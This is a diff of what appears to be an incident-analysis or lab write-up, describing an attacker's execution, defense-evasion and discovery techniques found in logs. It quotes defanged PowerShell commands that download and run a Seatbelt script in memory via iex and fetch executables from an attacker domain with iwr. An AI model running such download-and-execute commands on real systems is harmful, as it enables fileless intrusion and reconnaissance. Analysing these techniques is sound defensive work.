@@ -132,13 +132,16 @@ See explanation from Q7.
 
 The attacker's TTPs observed in the logs range from defense evasion to enumeration and data exfiltration. 
 
-1. Execution & Defense Evasion
-The attacker uses native system tools and scripting capabilities to execute their payload.
+1. Execution & Defense Evasion - The attacker uses native system tools and scripting capabilities to execute their payload.
 
 Evidence: The use of `iex` (`Invoke-Expression`) to download and execute a PowerShell script from GitHub (`Invoke-Seatbelt.ps1`). This is a common defense evasion technique, known as fileless execution, as `iex` can execute code in memory without writing it to disk.
+
 `iex(new-object net.webclient).downloadstring('hXXps://github[.]com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt[.]ps1')`
+
 Evidence: The use of `iwr` (`Invoke-WebRequest`) to download binaries from a remote server (`files[.]bpakcaging[.]xyz`). This avoids detection by endpoint security solutions that might block direct executable downloads.
+
 `iwr hXXp://files[.]bpakcaging[.]xyz/sb[.]exe -outfile sb[.]exe`
+
 `iwr hXXp://files[.]bpakcaging[.]xyz/sq3[.]exe -outfile sq3[.]exe`
 
 2. Discovery - After gaining a foothold in the system, the attacker gathers information about the environment and its user data.
